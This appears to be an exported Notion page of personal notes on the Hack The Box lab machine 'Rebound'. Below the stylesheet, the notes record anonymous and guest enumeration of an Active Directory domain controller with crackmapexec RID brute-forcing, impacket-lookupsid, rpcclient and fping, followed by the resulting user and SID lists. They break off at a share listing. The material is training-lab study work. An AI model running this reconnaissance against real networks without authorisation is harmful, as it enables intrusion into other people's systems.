@@ -1,0 +1,2023 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Rebound</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="bc64f284-46e4-4c6f-b0bb-16eba25737d2" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🏀</span></div><h1 class="page-title">Rebound</h1><p class="page-description"></p></header><div class="page-body"><p id="fa0024f6-256e-454f-aee4-222cacdd9abb" class="">enum4linux and rpc client</p><p id="1604f7c5-c3bb-42f3-aa39-a94ee0034d43" class="">
+</p><p id="f75fe1a0-e917-44ae-9fd6-4cc19fa961ae" class="">Bruteforcing  RID</p><p id="e067af83-a676-48bc-9b16-29d399a196ed" class=""><code>crackmapexec smb rebound.htb -u anonymous -p &quot;&quot; --rid-brute 10000</code></p><p id="21869e2b-5a0c-4e75-b15b-675695627835" class="">
+</p><p id="b7a98428-d4c8-4cd1-845f-05275f1c2860" class="">
+</p><p id="3084e6f6-a135-4799-a23d-5370e3411252" class="">Impacket lookupsid</p><p id="a0ca2dc9-5363-477d-b72e-02204ae35fe9" class=""><code>impacket-lookupsid rebound.htb/anonymous@10.129.126.67</code></p><p id="69948735-c7cf-4c36-a1bd-e850862118ce" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="663e3a06-2d92-49ee-b8c6-6d49840404b6" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ impacket-lookupsid rebound.htb/anon@10.129.126.67
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 10.129.126.67
+[*] StringBinding ncacn_np:10.129.126.67[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
+498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: rebound\Administrator (SidTypeUser)
+501: rebound\Guest (SidTypeUser)
+502: rebound\krbtgt (SidTypeUser)
+512: rebound\Domain Admins (SidTypeGroup)
+513: rebound\Domain Users (SidTypeGroup)
+514: rebound\Domain Guests (SidTypeGroup)
+515: rebound\Domain Computers (SidTypeGroup)
+516: rebound\Domain Controllers (SidTypeGroup)
+517: rebound\Cert Publishers (SidTypeAlias)
+518: rebound\Schema Admins (SidTypeGroup)
+519: rebound\Enterprise Admins (SidTypeGroup)
+520: rebound\Group Policy Creator Owners (SidTypeGroup)
+521: rebound\Read-only Domain Controllers (SidTypeGroup)
+522: rebound\Cloneable Domain Controllers (SidTypeGroup)
+525: rebound\Protected Users (SidTypeGroup)
+526: rebound\Key Admins (SidTypeGroup)
+527: rebound\Enterprise Key Admins (SidTypeGroup)
+553: rebound\RAS and IAS Servers (SidTypeAlias)
+571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
+572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
+1000: rebound\DC01$ (SidTypeUser)
+1101: rebound\DnsAdmins (SidTypeAlias)
+1102: rebound\DnsUpdateProxy (SidTypeGroup)
+1951: rebound\ppaul (SidTypeUser)
+2952: rebound\llune (SidTypeUser)
+3382: rebound\fflock (SidTypeUser)</code></pre><p id="bdea839d-1385-4605-8570-c896a322dac0" class="">
+</p><p id="c62eb5e8-44b4-4e44-bbea-857827bfc30d" class="">
+</p><p id="9eb61875-2213-4f08-ac7d-9012af674953" class="">users</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="64ed2e50-ab68-454a-877a-71ea01ec5388" class="code"><code class="language-PowerShell">1000: rebound\DC01$ (SidTypeUser)
+1101: rebound\DnsAdmins (SidTypeAlias)
+1102: rebound\DnsUpdateProxy (SidTypeGroup)
+1951: rebound\ppaul (SidTypeUser)
+2952: rebound\llune (SidTypeUser)
+3382: rebound\fflock (SidTypeUser)
+tbrady
+oorend
+delegator
+tbrady
+ldap_monitor
+batch_runner
+ServiceMgmt
+winrm_svc
+</code></pre><p id="bd69f7a4-b4a0-49ec-99ac-b2290fae247f" class="">
+</p><p id="48d5aa7b-b7cf-4ef4-acd0-a574db22e76c" class="">fping -asgq</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cd86e276-4e94-49d7-a087-441baabcc0a7" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-vgcariotxf]─[~]
+└──╼ [★]$ fping -asgq 10.129.126.67/23
+10.129.126.3
+10.129.126.16
+10.129.126.17
+10.129.126.31
+10.129.126.35
+10.129.126.39
+10.129.126.44
+10.129.126.51
+10.129.126.55
+10.129.126.58
+10.129.126.61
+10.129.126.64
+10.129.126.67
+10.129.126.73
+10.129.126.80
+10.129.126.83
+10.129.126.91
+10.129.126.102
+10.129.126.120
+10.129.126.126
+10.129.126.130
+10.129.126.135
+10.129.126.139
+10.129.126.143
+10.129.126.146
+10.129.126.150
+10.129.126.158
+10.129.126.161
+10.129.126.170
+10.129.126.174
+10.129.126.176
+10.129.126.179
+10.129.126.191
+10.129.126.203
+10.129.126.205
+10.129.126.209
+10.129.126.212
+10.129.126.218
+10.129.126.220
+10.129.126.221
+10.129.126.227
+10.129.126.230
+10.129.126.239
+
+     510 targets
+      43 alive
+     467 unreachable
+       0 unknown addresses</code></pre><p id="70edaceb-efbd-4a36-8a99-9c82d921008f" class="">
+</p><p id="64246bc9-a476-4be8-a05c-087c7d65560c" class="">for now we have a SID, user rebound</p><p id="2c5c0e95-4cf8-42df-a5e7-cf2ec8e2506a" class="">S-1-5-21-4078382237-1492182817-2568127209</p><p id="e799b9ef-f8a2-4b86-aaf0-3404a9953e78" class="">
+</p><p id="38b50df7-4f0b-42ea-a083-c34c6135b322" class="">rpcclient $&gt; getusername<br/>Account Name: Guest, Authority Name: rebound<br/></p><p id="ccb06f29-896d-4896-81fc-cc5a4e522f25" class="">
+</p><p id="d1f4fdb7-8343-444c-8f66-f1d712e31f0d" class="">when we use </p><p id="968aca15-5f56-4e4b-82d3-482b30ca196d" class=""><code>rpcclient -U &#x27;%&#x27; &lt;ip&gt;</code></p><p id="7aff76c5-948e-411a-a97c-6882e85502fd" class="">Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY</p><p id="d0887193-757f-4285-a329-53912e25a5ee" class="">
+</p><p id="8446e3ce-a65f-4227-8086-d619eb43a043" class="">User is Guest:</p><p id="59073ccd-cdf0-425a-826c-d871a9c3760d" class=""><code>srvinfo</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="465eb421-b7d4-443a-abec-626f4debd09e" class="code"><code class="language-PowerShell">rpcclient $&gt; srvinfo
+10.129.126.67  Wk Sv PDC Tim NT
+
+platform_id     :	500
+os version      :	10.0
+server type     :	0x80102b</code></pre><p id="50cc07e3-2af2-4413-824b-7fed2e96b9eb" class="">
+</p><p id="dbcdf28d-a166-477e-8907-799f2e3b2a7b" class="">lookupnames Guest</p><p id="fc8a0c9f-a15f-4b88-bf21-685a5e22255a" class="">Guest S-1-5-21-4078382237-1492182817-2568127209-501 (User: 1)</p><p id="a07bec91-98ec-4094-bfe4-ae948ef03674" class="">
+</p><p id="2843fd36-0fc1-476e-a3a9-922ba0640403" class="">rebound?</p><p id="59fa6106-2802-4000-ad30-4c05aa96b71b" class="">rebound S-1-5-21-4078382237-1492182817-2568127209</p><p id="de764f7f-dd8a-4df7-8ac2-65710fa288f3" class="">
+</p><p id="94ad36f4-6a52-4a3c-8a07-3c33f54e22cb" class="">lsaenumsid</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f02f6370-83d5-4d05-84d3-2abd6d7528d9" class="code"><code class="language-PowerShell">rpcclient $&gt; lsaenumsid
+found 18 SIDs
+
+S-1-5-90-0
+S-1-5-9
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-0
+S-1-5-6
+S-1-5-32-559
+S-1-5-32-554
+S-1-5-32-551
+S-1-5-32-550
+S-1-5-32-549
+S-1-5-32-548
+S-1-5-32-545
+S-1-5-32-544
+S-1-5-21-4078382237-1492182817-2568127209-7686
+S-1-5-20
+S-1-5-19
+S-1-5-11
+S-1-1-0</code></pre><p id="2f135a5a-6424-4127-96a0-008ef8fb8de8" class="">
+</p><p id="35047856-3c2c-4e2d-bf40-198f1a6f49df" class="">User is Guest:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="61e6375f-8553-4ba7-a0e9-12dd2b1cf1d2" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-vgcariotxf]─[~]
+└──╼ [★]$ cme smb 10.129.126.67 -u &#x27;Guest&#x27; -p &#x27;&#x27; --shares
+SMB         10.129.126.67   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+SMB         10.129.126.67   445    DC01             [+] rebound.htb\Guest: 
+SMB         10.129.126.67   445    DC01             [+] Enumerated shares
